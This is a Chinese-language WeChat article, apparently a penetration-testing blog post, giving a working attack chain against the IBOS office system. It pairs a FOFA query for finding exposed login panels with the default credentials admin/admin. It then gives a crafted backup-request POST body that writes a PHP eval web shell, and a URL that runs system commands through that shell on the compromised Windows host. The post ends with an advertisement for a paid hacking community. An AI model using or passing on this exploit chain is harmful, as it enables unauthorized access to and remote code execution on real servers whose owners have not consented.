> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X75ZbSpyMh-91BXDg1Lyvw)

一、后台弱口令  

fofa 语句：  

body="IBOS" && body="login-panel"

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCdNOrUefBlOwz8B4ZQeYAoynfSE8T0V9wiavaGFickOj4elnUJUtfl7GQ/640?wx_fmt=png)

我们随便点一个进去  

![](https://mmbiz.qpic.cn/mmbiz_jpg/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tC4bV4YZHVmTCdcasa40LOK5cdiaMcId0gfyF8pCyz6LibBxg5iaJDdwKzg/640?wx_fmt=jpeg)

弱口令：admin/admin

但是经过多次测试发现存在弱口令的只有一两个，这就导致后面的步骤将无法继续进行，所以多找找就好  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCickx7PFysd7XvumfTlotEyAeXdJfeRG4YxU90tjULLaC6Wk0DdZKdibw/640?wx_fmt=png)

二、任意文件上传  

这里我们已经到后台了，点通用设置 -> 数据库 -> 开启更多选项 -> 选择系统 MySQL Dump (Shell) 备份这个选项

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCCEYDpicpKYCdFCuIqgYHD7KsTuGgFUYAFEKY3tdtp2cTDyqfvkMFUFw/640?wx_fmt=png)

往下拉，点提交，抓包

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCSsdrc3b8Jf19t8iarHd9xOm81aqPxiaEzCK4T2cQiaQHVdPsRKUokUonQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCBkjcaHR06KticccBqmaiaSYKbmcGB1f0ytECHyYp6xSZ5sib01CuYMWPQ/640?wx_fmt=png)

在 post 数据里替换下面内容，上传 shell  

```
backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&file<?php eval($_GET[a3b4]);?>">a3b4%PATHEXT:~0,1%php%26a3b4&dbSubmit=1
```

三、远程代码执行

接着当然就是访问 shell 了

```
http://xxx.xxx.xxx.xxx/a3b4.php?cmd=system(%22whoami%22);
```

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCoOswTD3Myqx24axfxr3miaDCWMjuPlLsiaM9uUK3xVY7ticprJoQtQicwg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tC64fzicyLrxGw5JJ66libwAwkCYysONGm9m7CBOgRAm6UibgTC8CjIiaA9w/640?wx_fmt=png)

访问个 phpinfo

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tC347AncTOATWRcicyCqicpp5aicL4HocSfOcPTPBP4Uvu9bT5cqYUib3wuw/640?wx_fmt=png)

因为是 win 的，那就再来个 dir  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCiaVz6nP2TU5zicWciasKwnpIBQVNhlh3XhlLEzUG2DM8ml99T0kLjNl0w/640?wx_fmt=png)

到这里结束啦  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tC518adRLBKCGnNDyJAXLA8icsjwLp8JQq0yQskbjoMDhNbNbAtcYDib7g/640?wx_fmt=png)

推荐一下公众号  

公众号

bgbing 星球：渗透测试, 内网渗透, SRC 漏洞分享, 安全开发, 安全武器库

更多渗透测试，可以到星球学习啦（送 fofa 高级会员）

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Bic8Yb2o1xX1quwCz7f0tCh1RGQ6PlpjicJS6SIh1q6lem9m05xWwxibHYVeuAZFX43Q5C9UnMsJyA/640?wx_fmt=png)

凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数